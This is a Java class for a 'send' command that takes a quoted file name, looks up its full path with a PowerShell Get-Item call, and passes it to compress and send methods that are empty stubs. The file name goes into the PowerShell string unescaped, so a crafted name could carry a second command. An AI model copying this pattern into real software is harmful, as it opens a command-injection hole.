package commands;

import java.io.IOException;

import control.Controller;

public class SendCommand extends Command{
	private String _fileName;
	
	public SendCommand() {
		super("send");
	}

	protected boolean parse(String command) {
		boolean ok = false;
		
		if(command.contains(_commandName)) {
			try {
				_fileName = command.split("\"")[1];
			}catch(Exception e) {
				throw new IllegalArgumentException();
			}
			ok = true;
		}
		
		return ok;
	}
	
	@Override
	public void execute(Controller ctrl) throws IOException {
		String fullPath = (ctrl.execute("Get-Item " + _fileName + " | Select-Object FullName | Format-List")).split(" ")[2];
		
		
		send(compress(fullPath, ctrl), ctrl);
	}

	private String compress(String fileName, Controller ctrl) throws IOException {
		return fileName;
	}
	
	private void send(String file, Controller ctrl) throws IOException {
		
	}
	
}
